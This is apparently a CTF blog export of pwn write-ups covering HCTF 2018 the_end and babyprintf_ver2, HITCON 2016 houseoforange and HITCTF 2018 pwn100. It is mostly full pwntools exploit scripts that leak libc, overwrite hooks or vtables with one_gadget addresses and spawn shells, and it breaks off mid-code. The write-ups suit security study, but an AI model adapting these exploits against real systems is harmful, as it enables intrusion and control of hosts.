<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    BIN_PATH = <span class="string">&#x27;./the_end&#x27;</span></span><br><span class="line">    DEBUG = <span class="number">1</span></span><br><span class="line">    local = <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> DEBUG == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">            p = process(BIN_PATH)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            p = process(BIN_PATH, env=&#123;<span class="string">&#x27;LD_PRELOAD&#x27;</span>: <span class="string">&#x27;./libc.so.6&#x27;</span>&#125;)</span><br><span class="line">        elf = ELF(BIN_PATH)</span><br><span class="line">        context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">        context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;split&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> context.arch == <span class="string">&#x27;amd64&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">                libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            libc = ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = remote(<span class="string">&#x27;150.109.44.250&#x27;</span>, <span class="number">20002</span>)</span><br><span class="line">        p.recvuntil(<span class="string">&#x27;Input your token:&#x27;</span>)</span><br><span class="line">        p.sendline(<span class="string">&#x27;8RMQq9PuDRurd91OVhADpDDK30eqjAqz&#x27;</span>)</span><br><span class="line">        elf = ELF(BIN_PATH)</span><br><span class="line">        libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">        context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> DEBUG == <span class="number">1</span>:</span><br><span class="line">        gdb.attach(p, gdbscript=<span class="string">&#x27;b *0x0000555555554964&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;here is a gift &#x27;</span>)</span><br><span class="line">    recv = p.recvuntil(<span class="string">&#x27;,&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">    libc.address = int(recv, <span class="number">16</span>) - libc.symbols[<span class="string">&#x27;sleep&#x27;</span>]</span><br><span class="line">    <span class="keyword">print</span> hex(libc.address)</span><br><span class="line">    one_gadget = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;luck ;)\n&#x27;</span>)</span><br><span class="line">    p.send(p64(libc.address + (<span class="number">0x7ffff7ffdf48</span> - <span class="number">0x00007ffff7a0d000</span>)))</span><br><span class="line">    p.send(p64(libc.address + one_gadget[<span class="number">2</span>])[<span class="number">0</span>])</span><br><span class="line">    p.send(p64(libc.address + (<span class="number">0x7ffff7ffdf48</span> - <span class="number">0x00007ffff7a0d000</span>) + <span class="number">1</span>))</span><br><span class="line">    p.send(p64(libc.address + one_gadget[<span class="number">2</span>])[<span class="number">1</span>])</span><br><span class="line">    p.send(p64(libc.address + (<span class="number">0x7ffff7ffdf48</span> - <span class="number">0x00007ffff7a0d000</span>) + <span class="number">2</span>))</span><br><span class="line">    p.send(p64(libc.address + one_gadget[<span class="number">2</span>])[<span class="number">2</span>])</span><br><span class="line">    p.send(p64(libc.address + (<span class="number">0x7ffff7ffdf48</span> - <span class="number">0x00007ffff7a0d000</span>) + <span class="number">3</span>))</span><br><span class="line">    p.send(p64(libc.address + one_gadget[<span class="number">2</span>])[<span class="number">3</span>])</span><br><span class="line">    p.send(p64(libc.address + (<span class="number">0x7ffff7ffdf48</span> - <span class="number">0x00007ffff7a0d000</span>) + <span class="number">4</span>))</span><br><span class="line">    p.send(p64(libc.address + one_gadget[<span class="number">2</span>])[<span class="number">4</span>])</span><br><span class="line">    <span class="comment"># exec /bin/sh 1&gt;&amp;0</span></span><br><span class="line">    p.interactive()</span><br><span class="line">    p.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pwn()</span><br></pre></td></tr></table></figure>

<h2 id="babyprintf-ver2"><a href="#babyprintf-ver2" class="headerlink" title="babyprintf_ver2"></a>babyprintf_ver2</h2><p>程序本身实现了类似于格式化字符串漏洞的功能，但调用的是<code>printf_chk()</code>函数。用于保存用户输入的字符串的全局变量存在溢出，能够覆盖<code>stdout</code>指针，程序提供了.bss的地址。</p>
<p>因此，通过溢出将<code>stdout</code>指针指回.bss上，并在指向的地方构造虚假的<code>stdout</code>结构体，由于存在着<code>vtable</code>的检查，因此<code>vtable</code>处的值会被程序自己填入。通过构造缓冲区的指针为.bss上的地址，能够将这个<code>vtable</code>的值泄漏出来，从而获得libc的基地址。</p>
<p>同样地，通过构造缓冲区的指针，能够进行任意地址写的操作，将<code>__malloc_hook</code>处修改为<code>one_gadget</code>的地址。通过触发<code>printf_chk()</code>函数的报错进而触发<code>malloc()</code>拿到shell。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    BIN_PATH = <span class="string">&#x27;./babyprintf_ver2&#x27;</span></span><br><span class="line">    DEBUG = <span class="number">0</span></span><br><span class="line">    context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> DEBUG == <span class="number">1</span>:</span><br><span class="line">        p = process(BIN_PATH)</span><br><span class="line">        elf = ELF(BIN_PATH)</span><br><span class="line">        context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">        context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;split&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> context.arch == <span class="string">&#x27;amd64&#x27;</span>:</span><br><span class="line">            libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            libc = ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = remote(<span class="string">&#x27;150.109.44.250&#x27;</span>, <span class="number">20005</span>)</span><br><span class="line">        elf = ELF(BIN_PATH)</span><br><span class="line">        libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">        p.recvuntil(<span class="string">&#x27;Input your token:&#x27;</span>)</span><br><span class="line">        p.sendline(<span class="string">&#x27;8RMQq9PuDRurd91OVhADpDDK30eqjAqz&#x27;</span>)</span><br><span class="line">        context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;buffer location to&#x27;</span>)</span><br><span class="line">    recv = p.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">    bss_address = int(recv, <span class="number">16</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Have fun!\n&#x27;</span>)</span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">16</span> + p64(bss_address + <span class="number">0x20</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x00000000fbad2884</span>) + p64(bss_address + <span class="number">0xf8</span>) * <span class="number">3</span></span><br><span class="line">    payload += p64(bss_address + <span class="number">0xf8</span>) + p64(bss_address + <span class="number">0x100</span>) + p64(bss_address + <span class="number">0x11d</span>)</span><br><span class="line">    payload += p64(bss_address + <span class="number">0xf8</span>) + p64(bss_address + <span class="number">0x11d</span>) + p64(<span class="number">0</span>) * <span class="number">5</span> + p64(<span class="number">1</span>) + p64(<span class="number">0xffffffffffffffff</span>) + p64(<span class="number">0x0000000000000000</span>)</span><br><span class="line">    payload += p64(bss_address + <span class="number">0x130</span>) + p64(<span class="number">0xffffffffffffffff</span>) + p64(<span class="number">0</span>) * <span class="number">5</span> + p64(<span class="number">0x00000000ffffffff</span>)</span><br><span class="line"></span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;permitted!\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;a&#x27;</span> * <span class="number">8</span>)</span><br><span class="line">    recv = p.recv(<span class="number">8</span>)</span><br><span class="line">    libc.address = u64(recv) - (<span class="number">0x7ffff7dcc2a0</span> - <span class="number">0x7ffff79e4000</span>)</span><br><span class="line">    <span class="keyword">print</span> hex(libc.address)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">16</span> + p64(bss_address + <span class="number">0x20</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x00000000fbad2884</span>)</span><br><span class="line">    payload += p64(bss_address + <span class="number">0x200</span>) * <span class="number">7</span></span><br><span class="line">    payload += p64(bss_address + <span class="number">0x200</span>) + p64(<span class="number">0</span>) * <span class="number">5</span> + p64(<span class="number">1</span>) + p64(<span class="number">0xffffffffffffffff</span>) + p64(<span class="number">0x0000000000000000</span>)</span><br><span class="line">    payload += p64(bss_address + <span class="number">0x130</span>) + p64(<span class="number">0xffffffffffffffff</span>) + p64(<span class="number">0</span>) * <span class="number">5</span> + p64(<span class="number">0x00000000ffffffff</span>)</span><br><span class="line"></span><br><span class="line">    p.sendline(payload)</span><br><span class="line"></span><br><span class="line">    malloc_hook_addr = libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">16</span> + p64(bss_address + <span class="number">0x20</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x00000000fbad2884</span>)</span><br><span class="line">    payload += p64(bss_address + <span class="number">0x200</span>) * <span class="number">6</span></span><br><span class="line">    payload += p64(malloc_hook_addr) + p64(malloc_hook_addr + <span class="number">0x8</span> + <span class="number">4</span>) + p64(<span class="number">0</span>) * <span class="number">5</span> + p64(<span class="number">1</span>) + p64(<span class="number">0xffffffffffffffff</span>) + p64(<span class="number">0x0000000000000000</span>)</span><br><span class="line">    payload += p64(bss_address + <span class="number">0x130</span>) + p64(<span class="number">0xffffffffffffffff</span>) + p64(<span class="number">0</span>) * <span class="number">5</span> + p64(<span class="number">0x00000000ffffffff</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line"></span><br><span class="line">    p.sendline(p64(libc.address + <span class="number">0x10a38c</span>)) <span class="comment"># one_gadget</span></span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">16</span> + p64(bss_address + <span class="number">0x20</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x00000000fbad2884</span>)</span><br><span class="line">    payload += p64(bss_address + <span class="number">0x200</span>) * <span class="number">7</span></span><br><span class="line">    payload += p64(bss_address + <span class="number">0x200</span>) + p64(<span class="number">0</span>) * <span class="number">5</span> + p64(<span class="number">1</span>) + p64(<span class="number">0xffffffffffffffff</span>) + p64(<span class="number">0x0000000000000000</span>)</span><br><span class="line">    payload += p64(bss_address + <span class="number">0x130</span>) + p64(<span class="number">0xffffffffffffffff</span>) + p64(<span class="number">0</span>) * <span class="number">5</span> + p64(<span class="number">0x00000000ffffffff</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    sleep(<span class="number">0.5</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;%49$p&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line">    p.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pwn()</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>2018</tag>
        <tag>hctf</tag>
      </tags>
  </entry>
  <entry>
    <title>hitcon 2016 houseoforange writeup</title>
    <url>/2018/07/03/hitcon16-houseoforange/</url>
    <content><![CDATA[<h4 id="0x00-Program-Overall"><a href="#0x00-Program-Overall" class="headerlink" title="0x00 Program Overall"></a>0x00 Program Overall</h4><p>The program can <code>Build()</code>, <code>Upgrade()</code> and <code>See()</code> the house of orange. In <code>Build()</code>, the program first malloc a chunk of size 0x10 to store two address, one is color and price, and the other is the name. At the end of the <code>Build()</code>, a variable on bss will store the new house address and use it in <code>Upgrade()</code> and <code>See()</code>. We can use  <code>Upgrade()</code> and <code>See()</code> to update and see the newest house.</p>
<a id="more"></a>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Build</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)COUNT &gt; <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Too many house&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  New_House = <span class="built_in">malloc</span>(<span class="number">0x10</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Length of name :&quot;</span>);</span><br><span class="line">  size = InputNum();</span><br><span class="line">  <span class="keyword">if</span> ( size &gt; <span class="number">0x1000</span> )</span><br><span class="line">    size = <span class="number">4096</span>;</span><br><span class="line">  *((_QWORD *)New_House + <span class="number">1</span>) = <span class="built_in">malloc</span>(size);</span><br><span class="line">  <span class="keyword">if</span> ( !*((_QWORD *)New_House + <span class="number">1</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Malloc error !!!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Name :&quot;</span>);</span><br><span class="line">  InputString(*((<span class="keyword">void</span> **)New_House + <span class="number">1</span>), size);</span><br><span class="line">  new_price = <span class="built_in">calloc</span>(<span class="number">1u</span>LL, <span class="number">8u</span>LL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Price of Orange:&quot;</span>, <span class="number">8L</span>L);</span><br><span class="line">  *new_price = InputNum();</span><br><span class="line">  Show_Color();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Color of Orange:&quot;</span>);</span><br><span class="line">  Color_Num = InputNum();</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">  <span class="keyword">if</span> ( Color_Num == <span class="number">56746</span> )</span><br><span class="line">    new_price[<span class="number">1</span>] = <span class="number">56746</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    new_price[<span class="number">1</span>] = Color_Num + <span class="number">30</span>;</span><br><span class="line">  *(_QWORD *)New_House = new_price;</span><br><span class="line">  Last_House = New_House;</span><br><span class="line">  ++COUNT;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Finish&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="0x01-Program-Vulnerabilities"><a href="#0x01-Program-Vulnerabilities" class="headerlink" title="0x01 Program Vulnerabilities"></a>0x01 Program Vulnerabilities</h4><p>When the program calls the <code>Upgrade()</code>, it allows user to give it the length of the name which leads to heap overflow:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Upgrade</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Length of name :&quot;</span>);</span><br><span class="line">  v2 = InputNum();</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt; <span class="number">0x1000</span> )</span><br><span class="line">    v2 = <span class="number">4096</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Name:&quot;</span>);</span><br><span class="line">  InputString((<span class="keyword">void</span> *)Last_House[<span class="number">1</span>], v2);</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Finish&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>So, use unsorted bin attack and house of orange to get the shell.</p>
<h4 id="0x02-Pwn"><a href="#0x02-Pwn" class="headerlink" title="0x02 Pwn!"></a>0x02 Pwn!</h4><p>First we need to use heap overflow to trigger <code>_int_free()</code> in <code>sysmalloc()</code> to leak the libc address.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    p = process(<span class="string">&#x27;./houseoforange&#x27;</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">    Build(p, <span class="number">0x80</span>, <span class="string">&#x27;sunichi1&#x27;</span>, <span class="number">0x10</span>, <span class="number">1</span>) <span class="comment"># 1</span></span><br><span class="line">    <span class="comment"># overflow the top chunk&#x27;s size</span></span><br><span class="line">    payload = <span class="string">&#x27;B&#x27;</span>*<span class="number">0x80</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p32(<span class="number">0x1</span>) + p32(<span class="number">0x1f</span>) + <span class="number">2</span> * p64(<span class="number">0</span>) + p64(<span class="number">0xf31</span>)</span><br><span class="line">    Upgrade(p, <span class="number">0x100</span>, payload, <span class="number">0x10</span>, <span class="number">2</span>) <span class="comment"># 2</span></span><br><span class="line">    <span class="comment"># trigger free in sysmalloc</span></span><br><span class="line">    Build(p, <span class="number">0x1000</span>, <span class="string">&#x27;sunichi2&#x27;</span>, <span class="number">0x10</span>, <span class="number">3</span>) <span class="comment"># 3</span></span><br><span class="line">    <span class="comment"># get the info of libc address</span></span><br><span class="line">    Build(p, <span class="number">0x400</span>, <span class="string">&#x27;x&#x27;</span>, <span class="number">4</span>, <span class="number">4</span>) <span class="comment"># 0x400 = 1024 =&gt; large bin / still have some questions</span></span><br><span class="line">    See(p)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;house : &#x27;</span>)</span><br><span class="line">    libc_addr = p.recv(<span class="number">6</span>)</span><br><span class="line">    libc_addr = u64(libc_addr.ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    libc.address = libc_addr - <span class="number">0x3c4b78</span> - <span class="number">0x600</span></span><br><span class="line">    libc_base_addr = libc_addr - <span class="number">0x3c4b78</span> - <span class="number">0x600</span></span><br></pre></td></tr></table></figure>

<p>Second, leak the heap address.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># leak the heap address</span></span><br><span class="line">Upgrade(p, <span class="number">0x400</span>, <span class="string">&#x27;1&#x27;</span> * <span class="number">0x10</span>, <span class="number">0x10</span>, <span class="number">5</span>)</span><br><span class="line">See(p)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;1&#x27;</span> * <span class="number">0x10</span>)</span><br><span class="line">heap_addr = p.recv(<span class="number">6</span>)</span><br><span class="line"><span class="comment"># address is the third house content address - 0x10</span></span><br><span class="line">heap_addr = u64(heap_addr.ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br></pre></td></tr></table></figure>

<p>The final step is to construct the a chunk to perform unsorted bin attack and house of orange.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># unsorted bin attack and house of orange</span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x400</span>, <span class="string">&#x27;\x00&#x27;</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(<span class="number">0x2300000010</span>) + p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">vtable = heap_addr + <span class="number">0x410</span> + <span class="number">0x20</span> + <span class="number">0xc0</span> + <span class="number">0x10</span> + <span class="number">0x8</span> <span class="comment"># point to vtable itself</span></span><br><span class="line"><span class="comment"># change top chunk to 0x61 size and forge the stream</span></span><br><span class="line">fake_stream = <span class="string">&#x27;/bin/sh\x00&#x27;</span> + p64(<span class="number">0x61</span>) + p64(<span class="number">0</span>) + p64(libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>] - <span class="number">0x10</span>) <span class="comment"># here is heap + 0x410 + 0x20</span></span><br><span class="line">fake_stream = fake_stream.ljust(<span class="number">0xa0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_stream += p64(heap_addr + <span class="number">0x410</span> + <span class="number">0x20</span> + <span class="number">0xc0</span> + <span class="number">0x10</span>)</span><br><span class="line">fake_stream = fake_stream.ljust(<span class="number">0xc0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_stream += p64(<span class="number">1</span>) + <span class="number">2</span> * p64(<span class="number">0</span>) <span class="comment"># here is heap + 0x410 + 0x20 + 0xc0</span></span><br><span class="line">fake_stream += p64(vtable)</span><br><span class="line"></span><br><span class="line">payload += fake_stream</span><br><span class="line">payload += p64(<span class="number">2</span>)</span><br><span class="line">payload += p64(<span class="number">3</span>)</span><br><span class="line">payload += p64(libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line">Upgrade(p, len(payload), payload, <span class="number">0x10</span>, <span class="number">6</span>)</span><br></pre></td></tr></table></figure>

<p>Call <code>Build()</code> to trigger <code>malloc(0x10)</code> and get shell.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p.recvuntil(<span class="string">&#x27;Your choice : &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure>

<br>

<blockquote>
<h5 id="Relevant-Article"><a href="#Relevant-Article" class="headerlink" title="Relevant Article"></a>Relevant Article</h5><p><a href="https://sunichi.github.io/2018/07/02/pwnable-tw-bookwriter/">https://sunichi.github.io/2018/07/02/pwnable-tw-bookwriter/</a></p>
<p><a href="http://tacxingxing.com/2018/01/10/house-of-orange/">http://tacxingxing.com/2018/01/10/house-of-orange/</a></p>
<p><a href="http://tacxingxing.com/2018/02/09/fsp/">http://tacxingxing.com/2018/02/09/fsp/</a></p>
</blockquote>
]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>heap</tag>
        <tag>hitcon</tag>
        <tag>2016</tag>
        <tag>house</tag>
      </tags>
  </entry>
  <entry>
    <title>hitctf 2018 pwn100&amp;pwn200 writeup</title>
    <url>/2018/04/12/hitctf18-pwn100&amp;pwn200/</url>
    <content><![CDATA[<h4 id="0x00-pwn100"><a href="#0x00-pwn100" class="headerlink" title="0x00 pwn100"></a>0x00 pwn100</h4><p>保护措施：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<p>pwn100为简单的栈溢出：</p>
<a id="more"></a>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-28h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to pwn world!\nLeave your name:&quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">64u</span>);                           <span class="comment">// StackOverflow Here 64 -&gt; 40</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;bye~&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>只要将vuln函数的返回地址覆盖掉即可，使其返回到flag函数中，同时还需要构造flag函数的参数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">flag</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( a1 != <span class="number">0xDEADBEEF</span> )</span><br><span class="line">    CheckFailed();</span><br><span class="line">  command = <span class="string">&quot;cat flag&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a2 != <span class="number">0xC0FFEE</span> )</span><br><span class="line">    CheckFailed();</span><br><span class="line">  <span class="keyword">return</span> system(command);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>payload构造如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&#x27;A&#x27;</span> * <span class="number">44</span> + p32(flag_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(<span class="number">0xdeadbeef</span>) + p32(<span class="number">0xc0ffee</span>)</span><br></pre></td></tr></table></figure>

<h4 id="0x01-pwn200"><a href="#0x01-pwn200" class="headerlink" title="0x01 pwn200"></a>0x01 pwn200</h4><p>保护措施</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<p>该程序先进行登录，再进行验证，验证通过后获得flag：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> <span class="keyword">int</span> <span class="title">login</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v1; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> n; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v1 = <span class="number">255</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Username: &quot;</span>);</span><br><span class="line">  n = read_input_raw((<span class="keyword">int</span>)bss_username, <span class="number">16</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Password: &quot;</span>);</span><br><span class="line">  v3 = read_input_raw((<span class="keyword">int</span>)bss_password, <span class="number">32</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(bss_username, <span class="string">&quot;root&quot;</span>, n) &amp;&amp; !<span class="built_in">strncmp</span>(bss_password, <span class="string">&quot;passwd_has_be_changed_in_remote_&quot;</span>, v3) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(bss_username, <span class="string">&quot;lilac&quot;</span>, n) &amp;&amp; !<span class="built_in">strncmp</span>(bss_password, <span class="string">&quot;a_password_you_know_uh_huh_^_^@!&quot;</span>, v3) )</span><br><span class="line">    v1 = <span class="number">16</span>;</span><br><span class="line">  <span class="keyword">return</span> v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="keyword">int</span> <span class="title">check</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v1; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(bss_username, <span class="string">&quot;root&quot;</span>, <span class="number">4u</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Correct username!&quot;</span>);</span><br><span class="line">    v1 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Incorrect username!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(bss_password, <span class="string">&quot;passwd_has_be_changed_in_remote_&quot;</span>, <span 